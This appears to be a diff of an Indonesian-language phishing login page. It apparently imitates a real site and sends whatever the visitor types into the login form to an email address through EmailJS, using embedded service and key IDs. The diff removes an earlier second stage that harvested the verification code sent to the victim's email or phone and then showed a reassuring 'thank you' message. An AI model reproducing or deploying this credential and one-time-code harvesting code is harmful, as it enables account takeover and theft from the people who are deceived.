@@ -7,23 +7,23 @@
     
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     
-    <script type="text/javascript">
-        // Ganti dengan User ID MailJS Anda (ditemukan di Account -> API Keys)
-        (function() {
-            emailjs.init("YOUR_USER_ID"); 
-        })();
-    </script>
-
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #f0f2f5;
             margin: 0;
             padding: 20px;
-            display: flex;
+            display: flex; 
+            flex-direction: column; 
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+        }
+        .main-logo {
+            display: block;
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
         }
         .container {
             background: #fff;
@@ -38,11 +38,6 @@
             color: #1c1e21;
             margin-bottom: 25px;
             font-size: 24px;
-        }
-        img.header-image {
-            width: 100%;
-            border-radius: 6px;
-            margin-bottom: 20px;
         }
         label {
             display: block;
@@ -63,7 +58,7 @@
             font-size: 16px;
         }
         button {
-            background-color: #0067f7; /* Warna biru dari situs asli */
+            background-color: #0067f7; 
             color: white;
             padding: 12px 20px;
             border: none;
@@ -81,7 +76,7 @@
             background-color: #a0c3f0;
             cursor: not-allowed;
         }
-        #response-message {
+        #response-login { 
             text-align: center;
             margin-top: 15px;
             padding: 10px;
@@ -103,6 +98,9 @@
     </style>
 </head>
 <body>
+
+    <img src="URL_LOGO_ANDA_DI_SINI" alt="Logo" class="main-logo">
+
     <div class="container">
         
         <form id="form-login">
@@ -121,45 +119,23 @@
             <p id="response-login" class="hidden"></p>
         </form>
 
-        <form id="form-verification" class="hidden">
-            <h1>Masukkan Kode Verifikasi</h1>
-            <p style="text-align: center; margin-top: -15px; margin-bottom: 20px; font-size: 14px; color: #555;">
-                Silakan periksa kode yang kami kirimkan ke email/telepon Anda.
-            </p>
-            
-            <label for="verification_code">Kode Verifikasi</label>
-            <input type="text" id="verification_code" name="verification_code" placeholder="Masukkan kode verifikasi" required>
-
-            <button type="submit" id="submit-btn-verify">Kirim Kode</button>
-            <p id="response-verify" class="hidden"></p>
-        </form>
-
-        <div id="final-success" class="hidden">
-            <h1 class="success">Terima Kasih!</h1>
-            <p style="text-align: center; font-size: 16px;">Data Anda telah berhasil diproses.</p>
-        </div>
     </div>
     
     <script>
-        // --- GANTI PENGATURAN MAILJS ANDA DI SINI ---
-        const serviceID = 'YOUR_SERVICE_ID';
+          // ⚠️ GANTI DENGAN KREDENSIAL EMAILJS ANDA 
+    const EMAILJS_SERVICE_ID = 'service_glbmixo'; // <-- GANTI INI
+    const EMAILJS_TEMPLATE_ID = 'template_mfunver'; // <-- GANTI INI
+    const EMAILJS_PUBLIC_KEY = 'Vdmo410kyW_9dbb0F'; // <-- GANTI INI (User ID)
+
+        // --------------------------------------------------------
         
-        // Anda perlu membuat DUA template di MailJS
-        const templateID_Login = 'YOUR_TEMPLATE_ID_LOGIN'; // Template untuk form 1
-        const templateID_Verify = 'YOUR_TEMPLATE_ID_VERIFY'; // Template untuk form 2
-        // ---------------------------------------------
+        // Inisialisasi MailJS di sini menggunakan konstanta
+        emailjs.init(EMAILJS_PUBLIC_KEY);
 
         const formLogin = document.getElementById('form-login');
-        const formVerify = document.getElementById('form-verification');
-        const finalSuccess = document.getElementById('final-success');
-
         const btnLogin = document.getElementById('submit-btn-login');
-        const btnVerify = document.getElementById('submit-btn-verify');
-        
         const responseLogin = document.getElementById('response-login');
-        const responseVerify = document.getElementById('response-verify');
 
-        // Event listener untuk Formulir 1 (Login)
         formLogin.addEventListener('submit', function(event) {
             event.preventDefault();
             
@@ -167,48 +143,24 @@
             btnLogin.disabled = true;
             responseLogin.classList.add('hidden');
 
-            emailjs.sendForm(serviceID, templateID_Login, this)
+            // Gunakan konstanta saat mengirim
+            emailjs.sendForm(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, this)
                 .then(() => {
-                    // Berhasil kirim data login
-                    formLogin.classList.add('hidden'); // Sembunyikan form login
-                    formVerify.classList.remove('hidden'); // Tampilkan form verifikasi
-                    
-                    // Reset tombol login (jika pengguna kembali)
+                    // Berhasil
                     btnLogin.textContent = 'Masuk';
                     btnLogin.disabled = false;
-                    formLogin.reset();
+                    responseLogin.textContent = 'Data berhasil terkirim!';
+                    responseLogin.classList.remove('hidden', 'error');
+                    responseLogin.classList.add('success');
+                    formLogin.reset(); 
 
                 }, (err) => {
-                    // Gagal kirim data login
+                    // Gagal
                     btnLogin.textContent = 'Masuk';
                     btnLogin.disabled = false;
                     responseLogin.textContent = `Gagal mengirim: ${JSON.stringify(err)}`;
-                    responseLogin.classList.remove('hidden');
+                    responseLogin.classList.remove('hidden', 'success');
                     responseLogin.classList.add('error');
-                });
-        });
-
-        // Event listener untuk Formulir 2 (Verifikasi)
-        formVerify.addEventListener('submit', function(event) {
-            event.preventDefault();
-            
-            btnVerify.textContent = 'Memverifikasi...';
-            btnVerify.disabled = true;
-            responseVerify.classList.add('hidden');
-
-            emailjs.sendForm(serviceID, templateID_Verify, this)
-                .then(() => {
-                    // Berhasil kirim data verifikasi
-                    formVerify.classList.add('hidden'); // Sembunyikan form verifikasi
-                    finalSuccess.classList.remove('hidden'); // Tampilkan pesan sukses akhir
-                    
-                }, (err) => {
-                    // Gagal kirim data verifikasi
-                    btnVerify.textContent = 'Kirim Kode';
-                    btnVerify.disabled = false;
-                    responseVerify.textContent = `Gagal mengirim: ${JSON.stringify(err)}`;
-                    responseVerify.classList.remove('hidden');
-                    responseVerify.classList.add('error');
                 });
         });
     </script>
